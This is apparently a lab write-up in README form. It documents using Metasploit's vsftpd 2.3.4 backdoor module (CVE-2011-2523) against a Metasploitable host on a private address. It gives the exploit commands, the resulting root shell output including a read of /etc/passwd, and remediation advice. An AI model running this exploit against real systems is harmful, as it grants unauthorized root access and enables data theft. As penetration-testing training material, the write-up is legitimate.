# 💥 vsftpd 2.3.4 Backdoor Exploit Report

> Exploitation of a known vulnerability in `vsftpd 2.3.4` using Metasploit.

## 📌 Target Details

- **Target IP:** `192.168.150.133`
- **Service:** FTP  
- **Vulnerable Version:** vsftpd 2.3.4  
- **Exploit Module:** `exploit/unix/ftp/vsftpd_234_backdoor`  
- **Payload:** Command shell (TCP)

---

## 🔍 Vulnerability Summary

`vsftpd 2.3.4` contains a malicious backdoor that opens a command shell on port 6200 when a specially crafted username (ending in `:)`) is received.

> CVE: [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

---

## 🚀 Exploitation Steps

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.150.133
run
```

### 💥 Shell Access Gained:

```bash
whoami
> root

id
> uid=0(root) gid=0(root)

hostname
> metasploitable

uname -a
> Linux metasploitable 2.6.24-16-server #1 SMP ...

cat /etc/passwd
> root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
  ...
```

---

## 🔐 Impact

Root shell access gives the attacker full control over the target system — including privilege escalation, lateral movement, data exfiltration, and persistent access.

---

## ✅ Recommendation

- **Do NOT use vsftpd 2.3.4.**
- Upgrade to a secure, supported version.
- Restrict external access to FTP.
- Monitor suspicious traffic on port 6200.

---

## 📄 Report

📝 Full PDF report available in this repo: [vsftpd-exploit-report.pdf](./vsftpd-exploit-report.pdf)

---

## 📚 References

- [Rapid7 Module Info](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [CVE-2011-2523 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

---

## 👨‍💻 Author

Made with 🔥 by [vedpakhare](https://github.com/vedpakhare)
